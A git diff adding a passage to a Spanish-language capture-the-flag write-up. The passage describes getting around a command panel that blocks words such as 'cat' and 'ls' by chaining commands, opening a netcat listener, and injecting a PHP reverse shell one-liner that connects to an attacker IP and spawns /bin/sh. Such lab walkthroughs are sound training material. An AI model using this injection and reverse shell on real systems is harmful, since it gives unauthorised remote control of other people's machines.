@@ -25,8 +25,8 @@ Explicar la realización del siguiente _Capture the flag_ perteneciente a la pla
 ## Herramientas utilizadas
 
 - *Kali Linux*.
-- Enumeración: *Nmap*, *Dirsearch*, *Python*.
-- Penetración: *Bash*, *PHP*, *Netcat*. 
+- Enumeración: *Nmap*, *Dirsearch*.
+- Penetración: *FTP*, *Bash*, *PHP*, *Netcat*. 
 
 ## Steps
 
@@ -62,5 +62,14 @@ Por una parte, se realiza la conexión *FTP* indicando la IP de la víctima, don
 
 ![Captura de pantalla 2025-04-12 175910](https://github.com/user-attachments/assets/5c4f80d6-b28d-424f-b830-a074bf2a182b)
 
+Como se comentaba en el anterior apartado el panel de comandos no permite según que palabras, tales como  <code>cat</code> o <code>ls</code>. Por todo esto, lo más cómodo será realizar una **reverse shell**. Así que antes se pretende comprobar si dispone de la herramienta de **php** la máquina, para realizar el ataque con esta. Concatenando los siguiente comandos se consigue una respuesta positiva.
+
+<code>pwd;php --version</code>
+
+Con todo esto solo es necesario habilitar un puerto en escucha de la máquina atacante como se ha hecho en otras ocasiones. Y visistar la página de [*Pentestmonkey*](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) para obtener el código *php* para la *reverseshell*.
+
+<code>nc -lvnp 1234</code>
+
+<code>pwd;php -r '$sock=fsockopen("10.23.92.113",1234);exec("/bin/sh -i <&3 >&3 2>&3");'</code>
 
 **Flag: **
